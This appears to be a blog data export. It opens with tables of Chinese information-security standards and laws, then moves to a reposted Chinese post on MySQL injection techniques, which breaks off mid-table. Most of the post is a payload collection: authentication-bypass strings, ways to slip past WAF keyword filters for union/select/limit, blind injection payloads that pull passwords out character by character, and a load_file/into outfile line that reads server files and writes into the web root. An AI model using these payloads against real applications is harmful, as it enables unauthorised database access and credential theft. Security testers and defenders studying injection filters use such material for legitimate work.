云计算服务安全能力要求</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 31167-2023</td>\n<td>信息安全技术 云计算服务安全指南</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42574-2023</td>\n<td>信息安全技术 个人信息处理中告知和同意的实施指南</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42572-2023</td>\n<td>信息安全技术 可信执行环境服务规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42583-2023</td>\n<td>信息安全技术 政务网络安全监测平台技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42571-2023</td>\n<td>信息安全技术 区块链信息服务安全规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42582-2023</td>\n<td>信息安全技术 移动互联网应用程序（App）个人信息安全测评规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42570-2023</td>\n<td>信息安全技术 区块链技术安全框架</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42564-2023</td>\n<td>信息安全技术 边缘计算安全技术要求</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 28451-2023</td>\n<td>信息安全技术 网络入侵防御产品技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 20945-2023</td>\n<td>信息安全技术 网络安全审计产品技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 30282-2023</td>\n<td>信息安全技术 反垃圾邮件产品技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 20986-2023</td>\n<td>信息安全技术 网络安全事件分类分级指南</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42573-2023</td>\n<td>信息安全技术 网络身份服务安全技术要求</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 35282-2023</td>\n<td>信息安全技术 电子政务移动办公系统安全技术规范</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 32920-2023</td>\n<td>信息安全技术 行业间和组织间通信的信息安全管理</td>\n<td>2023-05-23</td>\n<td>2023-12-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42447-2023</td>\n<td>信息安全技术 电信领域数据安全指南</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42453-2023</td>\n<td>信息安全技术 网络安全态势感知通用技术要求</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42460-2023</td>\n<td>信息安全技术 个人信息去标识化效果评估指南</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 32922-2023</td>\n<td>信息安全技术 IPSec VPN 安全接入基本要求与实施指南</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 21054-2023</td>\n<td>信息安全技术 公钥基础设施 PKI 系统安全测评方法</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 21053-2023</td>\n<td>信息安全技术 公钥基础设施 PKI 系统安全技术要求</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 20274.1-2023</td>\n<td>信息安全技术 信息系统安全保障评估框架 第 1 部分：简介和一般模型</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 33134-2023</td>\n<td>信息安全技术 公共域名服务系统安全要求</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42461-2023</td>\n<td>信息安全技术 网络安全服务成本度量指南</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n<tr>\n<td>GB&#x2F;T 42446-2023</td>\n<td>信息安全技术 网络安全从业人员能力基本要求</td>\n<td>2023-03-17</td>\n<td>2023-10-01</td>\n</tr>\n</tbody></table>\n<h3 id=\"2022-年新发布\"><a href=\"#2022-年新发布\" class=\"headerlink\" title=\"2022 年新发布\"></a>2022 年新发布</h3><table>\n<thead>\n<tr>\n<th>标准号</th>\n<th>名称</th>\n<th>发布日期</th>\n<th>实施日期</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=97F140EC1874D4C25CB8DC53B1D102D0\">GB 42250-2022</a></td>\n<td>信息安全技术 网络安全专用产品安全技术要求</td>\n<td>2022-12-29</td>\n<td>2023-07-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=62C795EBF1BF0200A7161718CEFAABA8\">GB&#x2F;T 41817-2022</a></td>\n<td>信息安全技术 个人信息安全工程指南</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=BE74B9780B8C4852D62CF47F282478B6\">GB&#x2F;T 41819-2022</a></td>\n<td>信息安全技术 人脸识别数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=EACA08F5F077771ACE82FBE7987F40AE\">GB&#x2F;T 41806-2022</a></td>\n<td>信息安全技术 基因识别数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=2137495F032BA9E69A753016027D271C\">GB&#x2F;T 41773-2022</a></td>\n<td>信息安全技术 步态识别数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=AF1E9400C0F9C7051C33F773274825EA\">GB&#x2F;T 41807-2022</a></td>\n<td>信息安全技术 声纹识别数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=9679A3BF5D736D7FC92FD8157AAAAC82\">GB&#x2F;T 42014-2022</a></td>\n<td>信息安全技术 网上购物服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=136B8F06A548FAE8ABB375E4C65C1E38\">GB&#x2F;T 42012-2022</a></td>\n<td>信息安全技术 即时通信服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=CEB5771DBBF05ED5EA99EBA50896537F\">GB&#x2F;T 42015-2022</a></td>\n<td>信息安全技术 网络支付服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=182AA2DDF9F1EB9A69193B9CA528BBC4\">GB&#x2F;T 42017-2022</a></td>\n<td>信息安全技术 网络预约汽车服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=20615352AC128FC97F8005161976B921\">GB&#x2F;T 42016-2022</a></td>\n<td>信息安全技术 网络音视频服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=CDBCE8F2E4CDE60A86092361A8796178\">GB&#x2F;T 42013-2022</a></td>\n<td>信息安全技术 快递物流服务数据安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=4D3C5BB193E079AD54294E5845749B8F\">GB&#x2F;T 41871-2022</a></td>\n<td>信息安全技术 汽车数据处理安全要求</td>\n<td>2022-10-14</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=1D986D9DCCC518D19DAD9431DD76053E\">GB&#x2F;T 39204-2022</a></td>\n<td>信息安全技术 关键信息基础设施安全保护要求</td>\n<td>2022-10-12</td>\n<td>2023-05-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=5D7C9B95DB5F844C84F2F6C08843E2BB\">GB&#x2F;T 41578-2022</a></td>\n<td>电动汽车充电系统信息安全技术要求及试验方法</td>\n<td>2022-07-11</td>\n<td>2023-02-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=B4272EB52F5930B214910854EFEA4C5F\">GB&#x2F;T 41400-2022</a></td>\n<td>信息安全技术 工业控制系统信息安全防护能力成熟度模型</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=FDA38AB7D08A715C6B6D69DFDEABB2C0\">GB&#x2F;T 20984-2022</a></td>\n<td>信息安全技术 信息安全风险评估方法</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=2134DD3D7ED96B383E61C496D6E19D58\">GB&#x2F;T 41574-2022</a></td>\n<td>信息技术 安全技术 公有云中个人信息保护实践指南</td>\n<td>2022-07-11</td>\n<td>2023-02-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12A71EBE05397BE0A0AF33F\">GB&#x2F;T 41387-2022</a></td>\n<td>信息安全技术 智能家居通用安全规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12C71EBE05397BE0A0AF33F\">GB&#x2F;T 41388-2022</a></td>\n<td>信息安全技术 可信执行环境 基本安全规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12E71EBE05397BE0A0AF33F\">GB&#x2F;T 41389-2022</a></td>\n<td>信息安全技术 SM9 密码算法使用规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C13071EBE05397BE0A0AF33F\">GB&#x2F;T 41391-2022</a></td>\n<td>信息安全技术 移动互联网应用程序（App）收集个人信息基本要求</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12471EBE05397BE0A0AF33F\">GB&#x2F;T 41479-2022</a></td>\n<td>信息安全技术 网络数据处理安全要求</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C09371EBE05397BE0A0AF33F\">GB&#x2F;T 20984-2022</a></td>\n<td>信息安全技术 信息安全风险评估方法<br />代替标准号：<a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D786C1D3A7E05397BE0A0AB82A\">GB&#x2F;T 20984-2007</a> 信息安全技术 信息安全风险评估规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12171EBE05397BE0A0AF33F\">GB&#x2F;T 29829-2022</a></td>\n<td>信息安全技术 可信计算密码支撑平台功能与接口规范<br />代替标准号：<a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D7E974D3A7E05397BE0A0AB82A\">GB&#x2F;T  29829-2013</a> 信息安全技术 可信计算密码支撑平台功能与接口规范</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C13471EBE05397BE0A0AF33F\">GB&#x2F;T 30283-2022</a></td>\n<td>信息安全技术 信息安全服务 分类与代码<br />代替标准号：<a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D7EDA9D3A7E05397BE0A0AB82A\">GB&#x2F;T 30283-2013</a> 信息安全技术 信息安全服务 分类</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=DD3D95E5C12B71EBE05397BE0A0AF33F\">GB&#x2F;T 31506-2022</a></td>\n<td>信息安全技术 政务网站系统安全指南<br />代替标准号：<a href=\"http://std.samr.gov.cn/gb/search/gbDetailed?id=71F772D804F5D3A7E05397BE0A0AB82A\">GB&#x2F;T 31506-2015</a> 信息安全技术 政府门户网站系统安全技术指南</td>\n<td>2022-04-15</td>\n<td>2022-11-01</td>\n</tr>\n<tr>\n<td><a href=\"https://openstd.samr.gov.cn/bzgk/gb/newGbInfo?hcno=56123482721B1AC3CEDCD3B5C022CAD8\">GB&#x2F;T 25069-2022</a></td>\n<td>信息安全技术 术语</td>\n<td>2022-03-09</td>\n<td>2022-10-01</td>\n</tr>\n<tr>\n<td></td>\n<td><a href=\"http://www.cac.gov.cn/2022-01/04/c_1642894602182845.htm\">网络安全审查办法</a></td>\n<td>2022-01-04</td>\n<td>2022-2-15</td>\n</tr>\n</tbody></table>\n<h3 id=\"2021-年及以前（按体系分类）\"><a href=\"#2021-年及以前（按体系分类）\" class=\"headerlink\" title=\"2021 年及以前（按体系分类）\"></a>2021 年及以前（按体系分类）</h3><h4 id=\"一般性法律规定\"><a href=\"#一般性法律规定\" class=\"headerlink\" title=\"一般性法律规定\"></a>一般性法律规定</h4><ul>\n<li>《中华人民共和国宪法》，法律效力位阶：宪法，施行日期：2018-03-11</li>\n<li>《中华人民共和国国家安全法》，法律效力位阶：法律，施行日期：2015-07-01</li>\n<li>《中华人民共和国治安管理处罚法》，法律效力位阶：法律，施行日期：2013-01-01</li>\n<li>《中华人民共和国保守国家秘密法》，法律效力位阶：法律，施行日期：2010-10-01</li>\n</ul>\n<h4 id=\"规范和惩罚信息网络犯罪的法律\"><a href=\"#规范和惩罚信息网络犯罪的法律\" class=\"headerlink\" title=\"规范和惩罚信息网络犯罪的法律\"></a>规范和惩罚信息网络犯罪的法律</h4><ul>\n<li>《中华人民共和国刑法》，法律效力位阶：法律，施行日期：2021-03-01</li>\n<li>《全国人民代表大会常务委员会关于维护互联网安全的决定》法律效力位阶：有关法律问题和重大问题的决定，施行日期：2000-12-28</li>\n</ul>\n<h4 id=\"直接针对信息安全的特别规定\"><a href=\"#直接针对信息安全的特别规定\" class=\"headerlink\" title=\"直接针对信息安全的特别规定\"></a>直接针对信息安全的特别规定</h4><ul>\n<li>《中华人民共和国网络安全法》，法律效力位阶：法律，施行日期：2017-06-01</li>\n<li>《中华人民共和国计算机信息系统安全保护条例》，法律效力位阶：行政法规，公布日期：2011-01-08</li>\n<li>《中华人民共和国电信条例》，法律效力位阶：行政法规，公布日期：2016-02-06</li>\n<li>《中华人民共和国计算机信息网络国际联网管理暂行规定》，法律效力位阶：行政法规，公布日期：1997-05-20</li>\n<li>《计算机信息网络国际联网安全保护管理办法》，法律效力位阶：行政法规，公布日期：2011-01-08</li>\n</ul>\n<h4 id=\"具体规范信息安全技术、信息安全管理\"><a href=\"#具体规范信息安全技术、信息安全管理\" class=\"headerlink\" title=\"具体规范信息安全技术、信息安全管理\"></a>具体规范信息安全技术、信息安全管理</h4><ul>\n<li>《中华人民共和国电子签名法》，法律效力位阶：法律，施行日期：2019-04-23</li>\n<li>《计算机软件保护条例》，法律效力位阶：行政法规，公布日期：2013-01-30</li>\n<li>《商用密码管理条例》，法律效力位阶：行政法规，公布日期：1999-10-07</li>\n<li>《中华人民共和国保守国家秘密法实施条例》，法律效力位阶：行政法规，公布日期：2014-01-17</li>\n<li>GB&#x2F;T 37090-2018《信息安全技术 病毒防治产品安全技术要求和测试评价方法》，施行日期：2019-07-01</li>\n<li>《计算机信息系统国际联网保密管理规定》，颁布单位：国家保密局，施行日期：2000-01-01</li>\n<li>《金融机构计算机信息系统安全保护工作暂行规定》，颁布单位：公安部，颁布时间：1998-08-31</li>\n</ul>\n<h2 id=\"关键词\"><a href=\"#关键词\" class=\"headerlink\" title=\"关键词\"></a>关键词</h2><h3 id=\"安全等级保护\"><a href=\"#安全等级保护\" class=\"headerlink\" title=\"安全等级保护\"></a>安全等级保护</h3><ul>\n<li>GB&#x2F;T 22240-2020，《信息安全技术 网络安全等级保护定级指南》，发布日期：2020-04-28，2020-11-01</li>\n<li>GB&#x2F;T 25058-2019，《信息安全技术 网络安全等级保护实施指南》，发布日期：2019-08-30，2020-03-01</li>\n<li>GB&#x2F;T 25070-2019，《信息安全技术 网络安全等级保护安全设计技术要求》，发布日期：2019-05-10，2019-12-01</li>\n<li>GB&#x2F;T 22239-2019，《信息安全技术 网络安全等级保护基本要求》，发布日期：2019-05-10，2019-12-01</li>\n<li>GB&#x2F;T 28448-2019，《信息安全技术 网络安全等级保护测评要求》，发布日期：2019-05-10，2019-12-01</li>\n<li>GB&#x2F;T 28449-2018，《信息安全技术 网络安全等级保护测评过程指南》，发布日期：2018-12-28，2019-07-01</li>\n<li>GB&#x2F;T 36958-2018，《信息安全技术 网络安全等级保护安全管理中心技术要求》，发布日期：2018-12-28，2019-07-01</li>\n<li>GB&#x2F;T 36959-2018，《信息安全技术 网络安全等级保护测评机构能力要求和评估规范》，发布日期：2018-12-28，2019-07-01</li>\n<li>GB&#x2F;T 37138-2018，《电力信息系统安全等级保护实施指南》，发布日期：2018-12-28，2019-07-01</li>\n<li>GB&#x2F;T 36627-2018，《信息安全技术 网络安全等级保护测试评估技术指南》，发布日期：2018-09-17，2019-04-01</li>\n<li>GB&#x2F;T 35317-2017，《公安物联网系统信息安全等级保护要求》，发布日期：2017-12-29，2017-12-29</li>\n</ul>\n<h3 id=\"数据安全\"><a href=\"#数据安全\" class=\"headerlink\" title=\"数据安全\"></a>数据安全</h3><ul>\n<li>GB&#x2F;T 43739-2024《数据安全技术 应用商店的移动互联网应用程序（App）个人信息处理规范性审核与管理指南》，发布日期：2024-04-25，实施日期：2024-11-01</li>\n<li>GB&#x2F;T 43697-2024《数据安全技术 数据分类分级规则》，发布日期：2024-03-15，实施日期：2024-10-01</li>\n<li>GB&#x2F;T 42775-2023《证券期货业数据安全风险防控 数据分类分级指引》，发布日期：2023-08-06，实施日期：2023-08-06</li>\n<li>GB&#x2F;T 35274-2023《数据安全技术 大数据服务安全能力要求》，发布日期：2023-08-06，实施日期：2024-03-01</li>\n<li>GB&#x2F;T 42447-2023《信息安全技术 电信领域数据安全指南》，发布日期：2023-03-17，实施日期：2023-10-01</li>\n<li>GB&#x2F;T 41819-2022《信息安全技术 人脸识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 41806-2022《信息安全技术 基因识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 41773-2022《信息安全技术 步态识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 41807-2022《信息安全技术 声纹识别数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42014-2022《信息安全技术 网上购物服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42012-2022《信息安全技术 即时通信服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42015-2022《信息安全技术 网络支付服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42017-2022《信息安全技术 网络预约汽车服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42016-2022《信息安全技术 网络音视频服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 42013-2022《信息安全技术 快递物流服务数据安全要求》，发布日期：2022-10-14，实施日期：2023-05-01</li>\n<li>GB&#x2F;T 39725-2020《信息安全技术 健康医疗数据安全指南》，发布日期：2020-12-14，实施日期：2021-07-01</li>\n<li>GB&#x2F;T 39477-2020《信息安全技术 政务信息共享 数据安全技术要求》，发布日期：2020-11-19，实施日期：2021-06-01</li>\n<li>GB&#x2F;T 37973-2019《信息安全技术 大数据安全管理指南》，发布日期：2019-08-30，实施日期：2020-03-01</li>\n<li>GB&#x2F;T 37988-2019《信息安全技术 数据安全能力成熟度模型》，发布日期：2019-08-30，实施日期：2020-03-01</li>\n<li>GB&#x2F;T 37373-2019《智能交通 数据安全服务》，发布日期：2019-05-10，实施日期：2019-12-01</li>\n</ul>\n<h3 id=\"开源软件\"><a href=\"#开源软件\" class=\"headerlink\" title=\"开源软件\"></a>开源软件</h3><ul>\n<li>GB&#x2F;T 42927-2023《金融行业开源软件测评规范》，发布日期：2023-08-06，实施日期：2023-08-06</li>\n</ul>\n<h3 id=\"信创\"><a href=\"#信创\" class=\"headerlink\" title=\"信创\"></a>信创</h3><ul>\n<li>网络关键设备和网络安全专用产品安全认证和安全检测结果检索，发布日期：2024-06-28（共 3286 项，符合标准 GB 42250-2022 等）</li>\n<li>《网络关键设备和网络安全专用产品目录》，发布日期：2023-07-03</li>\n</ul>\n"}],"Post":[{"title":"MySQL注入技巧","cover":"https://img0.baidu.com/it/u=2009713656,733522492&fm=253&fmt=auto&app=120&f=JPEG?w=1422&h=800","swiper_index":10,"top_group_index":10,"background":"#fff","date":"2025-03-20T02:43:02.000Z","updated":"2025-03-20T15:11:12.592Z","keywords":null,"description":null,"top":null,"top_img":null,"comments":1,"toc":null,"toc_number":null,"toc_style_simple":null,"copyright":null,"copyright_author":"转载","copyright_author_href":null,"copyright_url":null,"copyright_info":null,"mathjax":null,"katex":null,"aplayer":null,"highlight_shrink":null,"aside":null,"ai":null,"_content":"# 0x01 MYSQl灵活的语法\n\n***\n\n**1 MySQL语法以及认证绕过**\n\n注释符：\n\n```\n#， \n-- X(X为任意字符)\n/*(MySQL-5.1)\n;%00\n`\n'or 1=1;%00\n'or 1=1 union select 1,2`'\n'or 1=1 #\n'/*!50000or*/ 1=1 -- -      //版本号为5.1.38时只要小于50138\n'/*!or*/ 1=1 -- -\n```\n\n前缀：\n\n任意混合 `+ - ~ !`\n\n```\n'or --+2=- -!!!'2\n```\n\n测试后发现`and/or`后面可以跟上偶数个`!、~`可以替代空格，也可以混合使用(混合后规律又不同)，and/or前的空格可以省略\n\n```\n'or- -!!!1=1；\n```\n\n运算符：\n\n```\n^, =, !=, %, /, *, &, &&, |, ||, <, >, <<, >>, >=, <=, <>, <=>, XOR,DIV, SOUNDS LIKE, RLIKE, REGEXP, IS, NOT, BETWEEN,……\n\n'or 1 rlike '1\n```\n\n空格替换：`%20, %09, %0a, %0b, %0c, %0d, %a0`\n\n也可以插入括号，前缀，操作符，引号\n\n```\n'or+(1)sounds/**/like\"1\"--%a0-\n```\n\n字符串格式\n\n```\n    ' or \"a\"='a'\n    ' or 'a'=n'a'               //unicode\n    ' or 'a'=b'1100001'         //binary\n    ' or 'a'=_binary'1100001'   //5.5.41下测试无效\n    ' or 'a'=x'61'              //16进制\n```\n\n**2、MySQL常用的一些小工具**\n\n常量：`true， false， null， \\N, current_timestamp....`\n\n变量：`@myvar:=1`\n\n系统变量：`@@version, @@datadir....`\n\n常用函数：`version(), pi(), pow(), char(), substring()....`\n\n**3、MySQL类型转换**\n\n```\n' or 1=true #true=1, false=0\n' or 1 #true\n' or version()=5.5 #5.5.41-log\n\n' or round(pi(),1)+true+true+0.4=version() #3.1+1+1+0.4\n\nselect * from users where 'a'='b'='c'\nselect * from users where ('a'='b')='c'\nselect * from users where (false)='c'\nselect * from users where (0)='c'\nselect * from users where (0)=0\nselect * from users where true\nselect * from users\n```\n\n以上的语句都是同样的效果\n\n**4、认证绕过**\n\n绕过语句：`'='`\n\n```\nselect data from users where name=\"=\"\nselect data from users where flase=\" \nselect data from users where 0=0\n```\n\n绕过语句：`'-'`\n\n```\nselect data from users where name=''-''\nselect data from users where name=0-0\nselect data from users where 0=0\n```\n\n# 0x02 关键字过滤\n\n***\n\n空格\n\n过滤代码`/\\s/`\n\n```\n%20, %09, %0a, %0b, %0c, %0d, %a0\n```\n\n关键字`OR，AND`\n\n过滤代码`/\\sor\\s/i,/\\sand\\s/i`\n\n```\n'||1='1     #or\n'='\n'&&1='1     #and\n```\n\n关键字`union select`\n\n过滤代码`/union\\s+select/i`\n\n```\n'and(true)like(false)union(select(pass)from(users))#\n'union [all|distinct] select pass from users#\n'union%a0select pass from users#\n'union/*!select*/pass from users#\n/vuln.php?id=1 union/*&sort=*/select pass from users-- -\n```\n\n如果单独过滤union,使用盲注来获取数据\n\n```\n'and(select pass from users limit 1)='secret\n```\n\n通过子查询获取单值来进行比较\n\n关键字`limit`\n\n过滤代码`/limit/i`\n\n```\n'and(select pass from users where id=1)='a\n'and(select pass from users group by id having id=1)='a\n'and length((select pass from users having substr(pass,1,1)='a'))\n```\n\n关键字`having`\n\n过滤代码`/having/i`\n\n```\n'and(select substr(group_concat(pass),1,1)from users)='a\n```\n\n关键字`select ... from`\n\n过滤代码`/SELECT\\s+[A-Za-z.]+\\s+FROM/i/i`\n\n```\nselect [all|distinct] pass from users\nselect`table_name`from`information_schema` . `tables`\nselect pass as alias from users\nselect pass aliasalias from users\nselect pass`alias alias`from users\nselect+pass%a0from(users)\n```\n\n关键字`select`\n\n过滤代码`/select/i`\n\n### 1 有文件读取权限\n\n```\n' and substr(load_file('file'),locate('DocumentRoot',(load_file('file')))+\nlength('DocumentRoot'),10)='a'='' into outfile '/var/www/dump.txt\n```\n\n### 2 获取列名\n\n```\n' and 列名 is not null#\n' procedure analyse()#\n```\n\n使用substr来做过滤条件\n\n```\n'and substr(pass,1,1)='a\n```\n\n关键字`select,and,&`\n\n'0#\n\n```\nselect data from users where name = ''-0 # int typecast\nselect data from users where name = 0 # int typecast\nselect data from users where 0 = 0 # true\n```\n\n'-1#\n\n```\nselect data from users where 0 = -1 # false\n```\n\n使用条件判断来进行`true、false`的选择\n\n```\n    ifnull(nullif()), case when， if()\n    '-if(name='Admin',1,0)#\n```\n\n使用嵌套条件`'-if(`\n\n```\nif(name='Admin',1,0), // condition\nif(substr(pass,1,1)='a',1,0) // if true\n,0)# // if false    \n```\n\n# 0x03 函数过滤\n\n***\n\n构建字符串相关函数\n\n```\nunhex char hex ascii ord substr substring mid pad left right insert\n' and substr(data,1,1) = 'a'#\n' and substr(data,1,1) = 0x61# 0x6162\n' and substr(data,1,1) = unhex(61)# unhex(6162)\n' and substr(data,1,1) = char(97)# char(97,98)\n' and hex(substr(data,1,1)) = 61#\n' and ascii(substr(data,1,1)) = 97#\n' and ord(substr(data,1,1)) = 97#\n```\n\n使用conv来进行进制的转换\n\n```\n' and substr(data,1,1) = lower(conv(10,10,36))# 'a'\n' and substr(data,1,1) = lower(conv(11,10,36))# 'b'\n' and substr(data,1,1) = lower(conv(36,10,36))# 'z'\n```\n\n使用函数来猜解数据\n\n```\n' and substr(data,1,1) = 'a'#\n' and substring(data,1,1) = 'a'#\n' and mid(data,1,1) = 'a'#\n```\n\n不适用逗号来获取\n\n```\n' and substr(data from 1 for 1) = 'a'#\n```\n\n同样也可以使用一下比较少见的函数来尝试绕过\n\n```\nlpad(data,1,space(1)) // lpad('hi',4,'?') = '??hi'\nrpad(data,1,space(1)) // rpad('hi',4,'?') = 'hi??'\nleft(data,1)\nreverse(right(reverse(data),1))\ninsert(insert(version(),1,0,space(0)),2,222,space(0))\n```\n\n有些函数有类似搜索匹配的功能\n\n```\n'-if(locate('f',data),1,0)#\n'-if(locate('fo',data),1,0)#\n'-if(locate('foo',data),1,0)#\ninstr(), position()\n```\n\n使用函数进行字符串的切割\n\n```\nlength(trim(leading 'a' FROM data)) # length will be shorter\nlength(replace(data, 'a', '')) # length will be shorter\n```\n\n2种方式都是相同效果\n\n# 0x04 注入时主要使用的一些东西\n\n***\n\n```\n1个控制流程操作(select, case, if(), ...)\n1个比较操作(=, like, mod(), ...)\n1个字符串的猜解(mid(), left(), rpad(), …)\n1个字符串生成(0x61, hex(), conv())\n```\n\n使用`conv([10-36],10,36)`可以实现所有字符的表示\n\n```\nfalse !pi()           0     ceil(pi()*pi())           10 A      ceil((pi()+pi())*pi()) 20       K\ntrue !!pi()           1     ceil(pi()*pi())+true      11 B      